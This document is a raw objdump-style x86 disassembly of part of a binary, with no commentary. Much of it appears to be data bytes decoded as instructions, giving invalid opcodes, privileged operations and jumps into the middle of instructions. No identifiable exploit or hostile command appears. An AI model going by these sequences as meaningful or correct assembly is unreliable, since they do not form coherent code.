  4224ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422500:	fwait
  422501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422502:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  42250a:	imul   dh
  42250c:	push   ss
  42250d:	into   
  42250e:	adc    al,0xc8
  422510:	xchg   ecx,eax
  422511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422512:	cmp    eax,0x51a49ba4
  422517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422518:	popf   
  422519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251a:	jnp    0x4224c0
  42251c:	xchg   ebx,eax
  42251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251e:	fwait
  42251f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422520:	xchg   ecx,eax
  422521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422522:	shl    dl,cl
  422524:	shr    ah,1
  422526:	lock int3 
  422528:	test   dh,0x16
  42252b:	cs adc al,0x28
  42252e:	push   ss
  42252f:	push   cs
  422530:	adc    al,0x8
  422532:	xchg   ebx,eax
  422533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422534:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42253b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42253c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422544:	fwait
  422545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422546:	lea    esp,[edx+edx*8-0xfd32fde]
  42254d:	or     al,0xf6
  42254f:	push   cs
  422550:	push   ss
  422551:	outs   dx,BYTE PTR ds:[esi]
  422552:	adc    al,0x68
  422554:	xchg   ecx,eax
  422555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422556:	add    BYTE PTR [eax],al
  422558:	loopne 0x42257d
  42255a:	inc    edx
  42255b:	add    ah,ch
  42255d:	and    eax,0x25f40042
  422562:	inc    edx
  422563:	add    BYTE PTR [edi+eiz*1+0x42],bh
  422567:	add    al,bl
  422569:	and    eax,DWORD PTR [edx+0x0]
  42256c:	clc    
  42256d:	and    eax,0x7c5a0042
  422572:	inc    edx
  422573:	add    dl,dl
  422575:	jle    0x4225b9
  422577:	add    al,ch
  422579:	es inc edx
  42257b:	add    BYTE PTR [edi+eiz*1+0x42],ch
  42257f:	add    ah,dl
  422581:	and    eax,0x25d80042
  422586:	inc    edx
  422587:	add    BYTE PTR [eax+0x27],ch
  42258a:	inc    edx
  42258b:	add    BYTE PTR [esi+eiz*1],bh
  42258e:	inc    edx
  42258f:	add    BYTE PTR [edx-0x35],cl
  422592:	push   es
  422593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422594:	scas   al,BYTE PTR es:[edi]
  422595:	or     al,0x6
  422597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422598:	lock and eax,0x26a00042
  42259e:	inc    edx
  42259f:	add    BYTE PTR [esi+eiz*1+0x26c00042],dh
  4225a6:	inc    edx
  4225a7:	add    al,dl
  4225a9:	es inc edx
  4225ab:	add    BYTE PTR [eax],ch
  4225ad:	es inc edx
  4225af:	add    ah,bl
  4225b1:	and    eax,DWORD PTR [edx+0x0]
  4225b4:	dec    eax
  4225b5:	es inc edx
  4225b7:	add    BYTE PTR [eax],bh
  4225b9:	es inc edx
  4225bb:	add    BYTE PTR [eax-0x51ffbdd9],al
  4225c1:	call   0xbde7:0x4338a406
  4225c8:	pop    eax
  4225c9:	es inc edx
  4225cb:	add    BYTE PTR [eax+0x26],ah
  4225ce:	inc    edx
  4225cf:	add    ah,bh
  4225d1:	and    eax,0x87240042
  4225d6:	loopne 0x422595
  4225d8:	jbe    0x422655
  4225da:	pop    ds
  4225db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225dc:	add    BYTE PTR [eax],al
  4225de:	inc    eax
  4225df:	add    dl,ch
  4225e1:	rcl    dl,cl
  4225e3:	pop    ecx
  4225e4:	iret   
  4225e5:	jle    0x422629
  4225e7:	add    bl,bl
  4225e9:	outs   dx,DWORD PTR fs:[esi]
  4225eb:	arpl   WORD PTR [edi+0xf],si
  4225ee:	pop    ebx
  4225ef:	xor    DWORD PTR [esi-0x5],esi
  4225f2:	(bad)  
  4225f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225f4:	mov    dl,0xc
  4225f6:	xchg   ebx,eax
  4225f7:	test   al,0xe4
  4225f9:	and    eax,0xdaaa0042
  4225fe:	push   es
  4225ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422600:	stos   BYTE PTR es:[edi],al
  422601:	fiadd  WORD PTR [esi]
  422603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422605:	fiadd  DWORD PTR [esi]
  422607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422608:	mov    ds:0xbea406da,al
  42260d:	fiadd  DWORD PTR [esi]
  42260f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422610:	mov    edx,0xb6a406da
  422615:	fiadd  DWORD PTR [esi]
  422617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422618:	mov    dl,0xda
  42261a:	push   es
  42261b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42261c:	mov    ds,edx
  42261e:	push   es
  42261f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422620:	mov    bl,dl
  422622:	push   es
  422623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422624:	out    dx,al
  422625:	fiadd  DWORD PTR [esi]
  422627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422628:	dec    DWORD PTR [ebx]
  42262a:	adc    edi,DWORD PTR [edx]
  42262c:	aam    0x23
  42262e:	inc    edx
  42262f:	add    ch,al
  422631:	sub    BYTE PTR [edx+0x0],al
  422634:	pop    ss
  422635:	loop   0x4225c0
  422637:	js     0x4225e7
  422639:	call   0xa4d7:0xcb3aa406
  422640:	and    al,0x75
  422642:	add    BYTE PTR [eax],al
  422644:	shl    BYTE PTR [ebx],1
  422646:	inc    edx
  422647:	add    BYTE PTR [edx],ah
  422649:	inc    ebx
  42264a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422658:	hlt    
  422659:	clc    
  42265a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422660:	sub    eax,DWORD PTR [edi+0x1f]
  422663:	jle    0x422665
	...
  422689:	add    BYTE PTR [eax],al
  42268b:	add    BYTE PTR [edx+0x7c],bl
  42268e:	inc    edx
	...
  42269b:	add    cl,bh
  42269d:	jmp    0xa48f26e3
  4226a2:	push   ecx
  4226a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a4:	jg     0x42264a
  4226a6:	inc    edi
  4226a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a8:	push   ecx
  4226a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226aa:	inc    ebx
  4226ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ac:	std    
  4226ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ae:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  4226b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b6:	push   ebx
  4226b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b8:	dec    ecx
  4226b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ba:	std    
  4226bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226bc:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  4226c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c4:	push   ecx
  4226c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c6:	jg     0x42266c
  4226c8:	std    
  4226c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ca:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  4226d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d2:	dec    ebx
  4226d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d4:	inc    ebx
  4226d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d6:	jne    0x42267c
  4226d8:	pop    ecx
  4226d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226da:	jnp    0x422680
  4226dc:	dec    ecx
  4226dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226de:	fwait
  4226df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226e8:	xor    eax,eax
  4226ea:	xor    esp,DWORD PTR [eax]
  4226ec:	xor    eax,DWORD PTR [eax]
  4226ee:	xor    esp,DWORD PTR [eax+0x33]
  4226f1:	inc    eax
  4226f2:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  4226f8:	xor    al,al
  4226fa:	xor    ah,BYTE PTR [eax]
  4226fc:	xor    al,BYTE PTR [eax]
  4226fe:	xor    ah,BYTE PTR [eax+0x32]
  422701:	inc    eax
  422702:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  422708:	xor    ecx,esp
  42270a:	xor    ecx,esi
  42270c:	xor    ecx,eax
  42270e:	xor    ecx,edx
  422710:	xor    edx,esp
  422712:	xor    edx,esi
  422714:	xor    edx,eax
  422716:	xor    edx,edx
  422718:	xor    ebx,esp
  42271a:	xor    ebx,esi
  42271c:	xor    ebx,eax
  42271e:	xor    ebx,edx
  422720:	xor    eax,esi
  422722:	push   ebx
  422723:	shl    BYTE PTR [ebx-0x40],0x93
  422727:	rcl    DWORD PTR [esi-0x56],0x15
  42272b:	into   
  42272c:	xchg   ebp,eax
  42272d:	dec    ecx
  42272e:	xor    ecx,esp
  422730:	sbb    eax,0x50abaae2
  422735:	push   0x1e
  422737:	cs je  0x42274e
  42273a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422740:	imul   edi,edx,0xffffffd5
  422743:	leave  
  422744:	daa    
  422745:	dec    eax
  422746:	out    dx,eax
  422747:	pushf  
  422748:	mov    dh,0xdf
  42274a:	dec    esi
  42274b:	xchg   ebp,eax
  42274c:	lock xor DWORD PTR [esi-0x6c],ebp
  422750:	inc    ebp
  422751:	or     eax,0xc1470876
  422756:	js     0x422713
  422758:	popa   
  422759:	pop    ecx
  42275a:	jecxz  0x4227c7
  42275c:	mov    BYTE PTR [edx-0x56],0x5
  422760:	cs enter 0xaa46,0x44
  422765:	aas    
  422766:	inc    ebp
  422767:	leave  
  422768:	test   BYTE PTR [ebx+0x819a593],0xd8
  42276f:	jl     0x4227d9
  422771:	mov    es,WORD PTR [edx+0x0]
  422774:	jb     0x4227d0
  422776:	pop    ss
  422777:	sub    ebx,esp
  422779:	and    eax,0x26400042
  42277e:	inc    edx
  42277f:	add    BYTE PTR [esi-0x5],dh
  422782:	fbld   TBYTE PTR [ebp+0x0]
	...
  422790:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  422796:	popa   
  422797:	arpl   WORD PTR [edi+0x7a],bp
  42279a:	popa   
  42279b:	outs   dx,DWORD PTR ds:[si]
  42279d:	gs ins DWORD PTR es:[edi],dx
  42279f:	jae    0x4227e3
  4227a1:	outs   dx,DWORD PTR ds:[esi]
  4227a2:	ins    BYTE PTR es:[edi],dx
  4227a3:	gs mov cl,0x65
  4227a6:	in     eax,dx
  4227a7:	jg     0x4227e2
  4227a9:	ja     0x422814
  4227ab:	jp     0x4227a0
  4227ad:	inc    esp
  4227ae:	push   0x1b
  4227b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b1:	push   ecx
  4227b2:	dec    esp
  4227b3:	gs jb  0x42282f
  4227b6:	popa   
  4227b7:	push   ebx
  4227b8:	jne    0x42282b
  4227ba:	jae    0x42281d
  4227bc:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  4227c3:	inc    esp
  4227c4:	(bad)  [edx+0x65]
  4227c7:	jae    0x42281f
  4227c9:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  4227d0:	jb     0x422834
  4227d2:	gs je  0x4227a8
  4227d5:	lds    edx,FWORD PTR [eax-0x68]
  4227d8:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  4227dc:	fs jne 0x42284e
  4227df:	push   eax
  4227e0:	gs fs jae 0x422851
  4227e4:	popa   
  4227e5:	ins    DWORD PTR es:[edi],dx
  4227e6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  4227f9:	add    BYTE PTR [eax],al
  4227fb:	add    BYTE PTR [esp+ecx*4],ch
  4227fe:	push   ss
  4227ff:	mov    esi,0x6f4c8773
  422804:	jb     0x422874
  422806:	jno    0x422871
  422808:	or     al,0x36
  42280a:	lods   al,BYTE PTR ds:[esi]
  42280b:	repnz push edx
  42280d:	je     0x42287e
  42280f:	je     0x422855
  422811:	js     0x4227cf
  422813:	cmc    
  422814:	outs   dx,DWORD PTR ds:[esi]
  422815:	ins    DWORD PTR es:[edi],dx
  422816:	popa   
  422817:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42281e:	popa   
  42281f:	jb     0x422896
  422821:	push   0x68736f79
  422826:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42282d:	mov    ch,0xa5
  42282f:	jns    0x4228a4
  422831:	outs   dx,DWORD PTR ds:[esi]
  422832:	addr16 popa 
  422834:	add    BYTE PTR [bp+si],bh
  422837:	sub    bh,cl
  422839:	icebp  
  42283a:	gs ins BYTE PTR es:[edi],dx
  42283c:	jae    0x422886
  42283e:	popa   
  42283f:	je     0x4228a9
  422841:	ins    DWORD PTR es:[edi],dx
  422842:	add    BYTE PTR gs:[bx+si],al
  422846:	in     al,dx
  422847:	mov    ecx,0x414ad1d2
  42284c:	ins    DWORD PTR es:[edi],dx
  42284d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422854:	gs ins DWORD PTR es:[edi],dx
  422856:	add    BYTE PTR [eax],al
  422858:	jne    0x42286a
  42285a:	popa   
  42285b:	or     BYTE PTR [esi+0x73654dbb],al
  422861:	popa   
  422862:	push   0x78000061
  422867:	loope  0x4228ab
  422869:	stos   BYTE PTR es:[edi],al
  42286a:	je     0x4228cd
  42286c:	push   edi
  42286d:	popa   
  42286e:	jb     0x4228db
  422870:	jae    0x4228dd
  422872:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422879:	loope  0x422847
  42287b:	aad    0x6f
  42287d:	jb     0x4228eb
  42287f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422886:	je     0x42289b
  422888:	adc    al,BYTE PTR [ebp+0x77646172]
  42288e:	outs   dx,DWORD PTR ds:[esi]
  42288f:	gs ins DWORD PTR es:[edi],dx
  422891:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  422898:	outs   dx,BYTE PTR ds:[esi]
  422899:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  4228a0:	ja     0x422906
  4228a2:	outs   dx,DWORD PTR ds:[esi]
  4228a3:	popa   
  4228a4:	outs   dx,BYTE PTR ds:[esi]
  4228a5:	gs jae 0x42290a
  4228a8:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  4228af:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  4228b7:	inc    ebx
  4228b8:	jb     0x422873
  4228ba:	sbb    al,0xd9
  4228bc:	jo     0x422927
  4228be:	addr16 js 0x422936
  4228c1:	jo     0x422938
  4228c3:	fs add ch,cl
  4228c6:	xchg   esi,eax
  4228c7:	in     eax,dx
  4228c8:	jno    0x42293b
  4228ca:	iret   
  4228cb:	jbe    0x4228c6
  4228cd:	or     dh,BYTE PTR [esi-0x3]
  4228d0:	cwde   
  4228d1:	int    0xd6
  4228d3:	std    
  4228d4:	pop    ebp
  4228d5:	fsubr  DWORD PTR [edi]
  4228d7:	dec    edx
  4228d8:	xor    eax,0xd6cd860a
  4228dd:	stc    
  4228de:	inc    ebx
  4228df:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228e5:	dec    edx
  4228e6:	sbb    BYTE PTR [ecx+0x52],bh
  4228e9:	mov    ch,al
  4228eb:	jns    0x42293f
  4228ed:	dec    edx
  4228ee:	sbb    BYTE PTR [ecx+0x6e],bh
  4228f1:	xchg   edx,eax
  4228f2:	cmp    eax,0xcd96c5cb
  4228f7:	in     eax,dx
  4228f8:	jno    0x42296b
  4228fa:	iret   
  4228fb:	jbe    0x4228f6
  4228fd:	or     dh,BYTE PTR [esi-0x3]
  422900:	int    0x96
  422902:	std    
  422903:	pop    ebp
  422904:	jns    0x422951
  422906:	pop    edx
  422907:	xor    eax,0x96cd920a
  42290c:	stc    
  42290d:	inc    ebx
  42290e:	icebp  
  42290f:	(bad)  
  422910:	das    
  422911:	int    0x76
  422913:	mov    BYTE PTR [ecx+0x6e],bh
  422916:	mov    DWORD PTR [edx-0x13749387],esi
  42291c:	jns    0x42298c
  42291e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422924:	retf   
  422925:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42292c:	jno    0x4228fd
  42292e:	jbe    0x422929
  422930:	or     dh,BYTE PTR [esi-0x3]
  422933:	int    0x96
  422935:	std    
  422936:	pop    ebp
  422937:	fdiv   DWORD PTR [ebx-0x6df55465]
  42293d:	int    0x96
  42293f:	stc    
  422940:	inc    ebx
  422941:	icebp  
  422942:	(bad)  
  422943:	test   BYTE PTR [ecx+0x6e],bh
  422946:	mov    ebp,esp
  422948:	int    0x76
  42294a:	mov    BYTE PTR [ecx+0x6e],bh
  42294d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422954:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42295b:	jno    0x42292c
  42295d:	jbe    0x422958
  42295f:	or     dh,BYTE PTR [esi-0x3]
  422962:	cwde   
  422963:	int    0xd6
  422965:	std    
  422966:	pop    ebp
  422967:	ret    0x2be4
  42296a:	cmp    DWORD PTR [edx],ecx
  42296c:	xchg   ch,cl
  42296e:	(bad)  
  42296f:	stc    
  422970:	inc    ebx
  422971:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422977:	test   BYTE PTR [ebx-0x78913648],ch
  42297d:	ret    0x79ab
  422980:	xchg   edx,eax
  422981:	aad    0xcb
  422983:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422989:	iret   
  42298a:	jbe    0x422985
  42298c:	or     dh,BYTE PTR [esi-0x3]
  42298f:	int    0x96
  422991:	std    
  422992:	pop    ebp
  422993:	pop    ecx
  422994:	ins    BYTE PTR es:[edi],dx
  422995:	cmp    dh,BYTE PTR ds:0x96cd920a
  42299b:	stc    
  42299c:	inc    ebx
  42299d:	icebp  
  42299e:	(bad)  
  42299f:	push   ebx
  4229a0:	int    0x76
  4229a2:	mov    BYTE PTR [ecx+0x6e],bh
  4229a5:	mov    BYTE PTR [edi+0x47816c79],ah
  4229ab:	jns    0x422a1b
  4229ad:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  4229b3:	call   0xcded:0xcd965b98
  4229ba:	jbe    0x4229f0
  4229bc:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  4229c3:	sbb    al,0x81
  4229c5:	(bad)  
  4229c6:	and    al,0x98
  4229c8:	int    0xd6
  4229ca:	adc    al,0x47
  4229cc:	mov    ds:0xff8eca62,al
  4229d1:	add    al,0x7d
  4229d3:	add    ch,dl
  4229d5:	lods   eax,DWORD PTR ds:[esi]
  4229d6:	clc    
  4229d7:	icebp  
  4229d8:	jo     0x4229a4
  4229da:	(bad)  
  4229dc:	jge    0x4229de
  4229de:	aad    0xad
  4229e0:	clc    
  4229e1:	icebp  
  4229e2:	jo     0x422976
  4229e4:	adc    ecx,ebp
  4229e6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229ed:	jo     0x422a5f
  4229ef:	jo     0x422a61
  4229f1:	jo     0x42298d
  4229f3:	xor    esi,edi
  4229f5:	cwde   
  4229f6:	add    al,0xc
  4229f8:	add    BYTE PTR [ebp-0x80],bl
  4229fb:	xchg   DWORD PTR [eax-0x30522a80],eax
  422a01:	or     DWORD PTR [eax-0x75],ebx
  422a04:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  422a0b:	jecxz  0x4229f8
  422a0d:	hlt    
  422a0e:	scas   eax,DWORD PTR es:[edi]
  422a0f:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a16:	sub    dl,0xfa
  422a19:	iret   
  422a1a:	pop    eax
  422a1b:	iret   
  422a1c:	push   0xffffffcd
  422a1e:	out    0xfd,al
  422a20:	int    0x76
  422a22:	adc    DWORD PTR [ebx],esi
  422a24:	out    0x34,al
  422a26:	sub    ecx,ecx
  422a28:	or     dh,BYTE PTR [esi-0x43]
  422a2b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a31:	sub    BYTE PTR [edi],0x6
  422a34:	sub    DWORD PTR [eax-0x72357f80],eax
  422a3a:	cmc    
  422a3b:	sub    esp,esi
  422a3d:	in     eax,dx
  422a3e:	aad    0xe9
  422a40:	add    ebx,ebp
  422a42:	mov    bh,dh
  422a44:	fcmovnbe st,st(5)
  422a46:	out    dx,eax
  422a47:	pushf  
  422a48:	xchg   edi,edi
  422a4a:	test   al,0xcf
  422a4c:	fs adc ebx,0xffffffe9
  422a50:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a54:	iret   
  422a55:	int3   
  422a56:	call   0x80c2791f
  422a5b:	jno    0x4229f5
  422a5d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a67:	int    0xe6
  422a69:	std    
  422a6a:	xor    esp,esi
  422a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a6d:	das    
  422a6e:	pop    ecx
  422a6f:	push   0xffffffcd
  422a71:	(bad)  
  422a72:	or     eax,0xfcde9e3
  422a77:	sub    edi,eax
  422a79:	xchg   DWORD PTR [edi],ecx
  422a7b:	iret   
  422a7c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a82:	add    BYTE PTR [eax-0x102c8233],0x88
  422a89:	add    al,0xf2
  422a8b:	add    DWORD PTR [ebx+0x2],0x80818069
  422a92:	adc    dh,0x4e
  422a95:	inc    ebx
  422a96:	jns    0x422a1a
  422a98:	fldlg2 
  422a9a:	es int 0xc6
  422a9d:	or     eax,0x809221bd
  422aa2:	add    al,0x81
  422aa5:	mov    al,ds:0xfb87d287
  422aaa:	add    al,0xbd
  422aac:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422ab3:	jns    0x422a82
  422ab5:	ins    DWORD PTR es:[edi],dx
  422ab6:	and    ch,0xa0
  422ab9:	push   edx
  422aba:	add    al,0x3
  422abc:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422ac2:	push   edx
  422ac3:	add    al,0x3
  422ac5:	push   ebx
  422ac6:	mov    al,cl
  422ac8:	test   bh,bh
  422aca:	retf   
  422acb:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422ad3:	(bad)  
  422ad4:	in     al,dx
  422ad5:	outs   dx,DWORD PTR ds:[esi]
  422ad6:	rcl    bl,1
  422ad8:	(bad)  
  422ad9:	jge    0x422a98
  422adb:	outs   dx,DWORD PTR ds:[esi]
  422adc:	xchg   edx,eax
  422add:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422ae4:	sahf   
  422ae5:	mov    al,ds:0x3454009e
  422aea:	jno    0x422b4e
  422aec:	popa   
  422aed:	mov    ah,0x86
  422aef:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422af6:	push   cs
  422af7:	(bad)  
  422af8:	jge    0x422ab7
  422afa:	push   eax
  422afb:	xchg   edx,eax
  422afc:	add    BYTE PTR [eax+0x2d048d6],0xff
  422b03:	jge    0x422ac2
  422b05:	push   ss
  422b06:	xchg   edx,eax
  422b07:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422b0e:	ror    BYTE PTR [ecx+0x53d09282],1
  422b14:	jo     0x422ae3
  422b16:	(bad)  
  422b17:	std    
  422b18:	xor    edx,esi
  422b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b1b:	inc    ebx
  422b1c:	(bad)  
  422b1d:	xor    al,0x2f
  422b1f:	or     esp,ebx
  422b21:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b2b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b35:	int    0xd6
  422b37:	popf   
  422b38:	aam    0x23
  422b3a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b40:	or     ch,0xd6
  422b43:	xchg   ebp,eax
  422b44:	aam    0x89
  422b46:	int    0xd6
  422b48:	icebp  
  422b49:	int    0x8d
  422b4b:	xchg   ebp,eax
  422b4c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b52:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b58:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b5e:	pushf  
  422b5f:	stos   BYTE PTR es:[edi],al
  422b60:	sahf   
  422b61:	popa   
  422b62:	mov    esp,0xc180804a
  422b67:	mov    BYTE PTR [edi+0x649a62d9],al
  422b6d:	mov    ecx,edx
  422b6f:	rol    DWORD PTR [edx+0x70878492],cl
  422b75:	int    0xc6
  422b77:	or     eax,0x808169bd
  422b7c:	adc    dh,0x14
  422b7f:	int    0x76
  422b81:	mov    ebp,0xd30de6cd
  422b86:	lods   eax,DWORD PTR ds:[esi]
  422b87:	xchg   DWORD PTR [ebx],esi
  422b89:	retf   
  422b8a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422b91:	in     al,dx
  422b92:	push   esi
  422b93:	int    0xc6
  422b95:	or     eax,0xbd92c704
  422b9a:	daa    
  422b9b:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422ba5:	or     eax,0xc087add3
  422baa:	mov    BYTE PTR [esi-0x30577740],bl
  422bb0:	gs jp  0x422b37
  422bb3:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422bbd:	xchg   esi,esp
  422bbf:	or     eax,0x699e30c0
  422bc4:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422bcb:	xor    ebp,DWORD PTR [ebp+0x6c]
  422bce:	int    0x10
  422bd0:	mov    ebp,0x808081bc
  422bd5:	int    0x7d
  422bd7:	xor    ecx,DWORD PTR [edi]
  422bd9:	xor    ah,0x81
  422bdc:	lea    esi,[ebp-0x7b8a19fc]
  422be2:	das    
  422be3:	add    al,0xd0
  422be5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bec:	int    0x8d
  422bee:	mov    ch,0x4
  422bf0:	cli    
  422bf1:	test   BYTE PTR [edx-0x61783f79],al
  422bf7:	int    0xe6
  422bf9:	jge    0x422bce
  422bfb:	xacquire xchg BYTE PTR [ebx],dh
  422bfe:	ins    DWORD PTR es:[edi],dx
  422bff:	ins    BYTE PTR es:[edi],dx
  422c00:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422c05:	outs   dx,DWORD PTR ds:[esi]
  422c06:	lods   al,BYTE PTR ds:[esi]
  422c07:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422c0d:	inc    esp
  422c0e:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c18:	lea    edi,[ebp+0x4a58d0a]
  422c1e:	cli    
  422c1f:	test   BYTE PTR [edx+0x402cd77],al
  422c25:	mov    dh,0xa5
  422c27:	and    ebx,0xa58d04ef
  422c2d:	xchg   edx,eax
  422c2e:	mov    es,WORD PTR [edx+edi*8]
  422c31:	dec    esi
  422c32:	ja     0x422c52
  422c34:	pop    ebp
  422c35:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c3b:	int    0xf
  422c3d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c43:	jecxz  0x422bf2
  422c45:	xchg   DWORD PTR [esi+0x7d],esi
  422c48:	or     dh,BYTE PTR [esi+0xd]
  422c4b:	in     al,dx
  422c4c:	inc    esi
  422c4d:	add    al,0xef
  422c4f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c55:	jecxz  0x422c43
  422c57:	jecxz  0x422c0f
  422c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c5a:	pop    esi
  422c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5c:	lods   eax,DWORD PTR ds:[esi]
  422c5d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c64:	lods   eax,DWORD PTR ds:[esi]
  422c65:	mov    ss,esi
  422c67:	mov    ebp,0x8086745d
  422c6c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c73:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c79:	test   al,0x33
  422c7b:	add    BYTE PTR [edx-0x33],bh
  422c7e:	leave  
  422c7f:	int    0xc6
  422c81:	or     eax,0x808059bd
  422c86:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c8e:	jecxz  0x422c79
  422c90:	mov    ss,esi
  422c92:	in     eax,dx
  422c93:	in     al,dx
  422c94:	add    BYTE PTR [eax],0x76
  422c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c98:	int    0x8d
  422c9a:	mov    ch,0x4
